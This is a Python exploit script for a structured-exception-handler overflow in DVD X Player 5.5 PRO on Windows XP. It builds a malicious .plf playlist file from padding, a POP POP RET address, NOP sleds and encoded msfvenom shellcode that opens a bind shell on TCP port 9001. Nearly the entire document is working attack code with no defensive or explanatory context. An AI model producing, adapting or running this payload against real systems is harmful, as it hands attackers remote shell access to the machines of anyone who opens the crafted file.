# Exploit for DVD X Player 5.5 PRO - SEH
# Author: Pal1Sec
# Tested on Windows XP Professional SP 3
#!/usr/bin/python

file = open("exploit.plf", "wb")

# POP POP RET address in SkinScrollBar.Dll = 0x100101e7
# msfvenom -p windows/shell_bind_tcp LPORT=9001 -a x86 EXITFUNC=thread -e x86/shikata_ga_nai -b "\x00\x0a\x0d\x1a" -f python -v shellcode_bind

shellcode_bind =  b""
shellcode_bind += b"\xba\x75\xbc\x98\x54\xd9\xca\xd9\x74\x24"
shellcode_bind += b"\xf4\x5b\x2b\xc9\xb1\x53\x31\x53\x12\x03"
shellcode_bind += b"\x53\x12\x83\xb6\xb8\x7a\xa1\xc4\x29\xf8"
shellcode_bind += b"\x4a\x34\xaa\x9d\xc3\xd1\x9b\x9d\xb0\x92"
shellcode_bind += b"\x8c\x2d\xb2\xf6\x20\xc5\x96\xe2\xb3\xab"
shellcode_bind += b"\x3e\x05\x73\x01\x19\x28\x84\x3a\x59\x2b"
shellcode_bind += b"\x06\x41\x8e\x8b\x37\x8a\xc3\xca\x70\xf7"
shellcode_bind += b"\x2e\x9e\x29\x73\x9c\x0e\x5d\xc9\x1d\xa5"
shellcode_bind += b"\x2d\xdf\x25\x5a\xe5\xde\x04\xcd\x7d\xb9"
shellcode_bind += b"\x86\xec\x52\xb1\x8e\xf6\xb7\xfc\x59\x8d"
shellcode_bind += b"\x0c\x8a\x5b\x47\x5d\x73\xf7\xa6\x51\x86"
shellcode_bind += b"\x09\xef\x56\x79\x7c\x19\xa5\x04\x87\xde"
shellcode_bind += b"\xd7\xd2\x02\xc4\x70\x90\xb5\x20\x80\x75"
shellcode_bind += b"\x23\xa3\x8e\x32\x27\xeb\x92\xc5\xe4\x80"
shellcode_bind += b"\xaf\x4e\x0b\x46\x26\x14\x28\x42\x62\xce"
shellcode_bind += b"\x51\xd3\xce\xa1\x6e\x03\xb1\x1e\xcb\x48"
shellcode_bind += b"\x5c\x4a\x66\x13\x09\xbf\x4b\xab\xc9\xd7"
shellcode_bind += b"\xdc\xd8\xfb\x78\x77\x76\xb0\xf1\x51\x81"
shellcode_bind += b"\xb7\x2b\x25\x1d\x46\xd4\x56\x34\x8d\x80"
shellcode_bind += b"\x06\x2e\x24\xa9\xcc\xae\xc9\x7c\x78\xa6"
shellcode_bind += b"\x6c\x2f\x9f\x4b\xce\x9f\x1f\xe3\xa7\xf5"
shellcode_bind += b"\xaf\xdc\xd8\xf5\x65\x75\x70\x08\x86\x5a"
shellcode_bind += b"\xa8\x85\x60\xf6\xba\xc3\x3b\x6e\x79\x30"
shellcode_bind += b"\xf4\x09\x82\x12\xac\xbd\xcb\x74\x6b\xc2"
shellcode_bind += b"\xcb\x52\xdb\x54\x40\xb1\xdf\x45\x57\x9c"
shellcode_bind += b"\x77\x12\xc0\x6a\x16\x51\x70\x6a\x33\x01"
shellcode_bind += b"\x11\xf9\xd8\xd1\x5c\xe2\x76\x86\x09\xd4"
shellcode_bind += b"\x8e\x42\xa4\x4f\x39\x70\x35\x09\x02\x30"
shellcode_bind += b"\xe2\xea\x8d\xb9\x67\x56\xaa\xa9\xb1\x57"
shellcode_bind += b"\xf6\x9d\x6d\x0e\xa0\x4b\xc8\xf8\x02\x25"
shellcode_bind += b"\x82\x57\xcd\xa1\x53\x94\xce\xb7\x5b\xf1"
shellcode_bind += b"\xb8\x57\xed\xac\xfc\x68\xc2\x38\x09\x11"
shellcode_bind += b"\x3e\xd9\xf6\xc8\xfa\xf9\x14\xd8\xf6\x91"
shellcode_bind += b"\x80\x89\xba\xff\x32\x64\xf8\xf9\xb0\x8c"
shellcode_bind += b"\x81\xfd\xa9\xe5\x84\xba\x6d\x16\xf5\xd3"
shellcode_bind += b"\x1b\x18\xaa\xd4\x09"

nops = 20 * "\x90"

buffer = "A" * 608 + "\xeb\x14\x90\x90\xe7\x01\x01\x10" + nops + shellcode_bind + nops + "C" * (2000-612-8-len(shellcode_bind)-len(2*nops))

file.write(buffer)
file.close()
